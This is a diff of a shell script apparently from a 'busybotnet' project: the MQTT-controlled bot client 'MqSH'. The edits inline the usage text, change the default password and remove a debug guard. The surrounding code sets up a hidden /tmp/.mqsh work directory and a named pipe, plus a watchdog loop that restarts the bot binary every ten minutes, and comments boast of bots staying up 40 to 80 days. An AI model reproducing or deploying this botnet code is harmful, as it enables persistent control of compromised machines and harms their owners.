@@ -2,28 +2,11 @@
 #      |\/| /  \ /__` |__| 			 
 #      |  | \__X .__/ |  | 	
 #		 
-###########################################
-# https://github.com/isdrupter/busybotnet 
-############ Set MqSH Version: ############
-export mq_version="2.0" # stable ! bots up 40+ days woo!  \o/ 
-#
-usage(){
-echo "MqSH Version $mq_version----------------------------------------------"
-  echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:password]]"
-  echo "             \ [[path][[default:/var/bin]][[debug][[default:0]]"
-  echo "              \ [[nicid]] [[subtopic]][[pubtopic]]             "
-  echo "		\ [httphost[default:localhost]]                "
-  echo " 		 \ [ipthost[default:localhost]]                "
-  echo " 		  \ [binpath[default:/var/bin]]                "
-  echo "--------------------------------------------------------------------"
-}
-
-case "$@" in -h|--help)
-usage
-exit 1
-;;
-esac
-
+##########################################
+# https://github.com/isdrupter/busybotnet
+##########################################
+# stable as *fuck*! 80+ days uptime!
+export mq_version="2.0a" 
 # create our enviroment
 cwd=$(pwd)
 workdir="/tmp/.mqsh"
@@ -49,7 +32,7 @@ if [[ ! -p $pipe ]]; then mkfifo $pipe ;fi
 #$mq_debug && echo [*] Exporting Config...
 unset mq_host mq_pass mq_path debug mq_intf mq_pubtop mq_subtop mq_httphost  mq_ipthost  mq_binpath mq_ip 2>>$errorlog
 export mq_host=${1:-"localhost"}
-export mq_pass=${2:-"xxxxx"}
+export mq_pass=${2:-"x"}
 export mq_path=${3:-"/usr/sbin:/bin:/usr/bin:/sbin:/var/bin"}
 export debug=${4:-"0"}
 export mq_intf=${5:-"eth0"}
@@ -123,7 +106,11 @@ done
 }
 
 if mq_debug ;then
-  usage
+  echo "MqSH Version $mq_version----------------------------------------------"
+  echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:password]]"
+  echo "             \ [[path][[default:/var/bin]][[debug][[default:0]]"
+  echo "		    \ [[nicid]]	[[subtopic]][[pubtopic]]	     "
+  echo "Options:-------------------------------------------------------"
   trap ctrl_c EXIT INT TERM
   while true;do
     export errorlog="$workdir/error.log"
@@ -146,7 +133,7 @@ else
   while true;do
     getConfig >>$errorlog 2>&1
     spitSomeBin >>$errorlog 2>&1
-    mq_debug || doFirst >>$errorlog 2>&1
+    doFirst >>$errorlog 2>&1
     (sh -c "while true;do sleep 600;pidof ash >/dev/null 2>&1||(start-stop-daemon -p $pidfile -S --exec $mq_shell $mq_binpath/mq &) ;done"&) >/dev/null 2>&1 & echo "$!" > $shpidfile 
     run >>$errorlog 2>&1
     let COUNT=COUNT+1
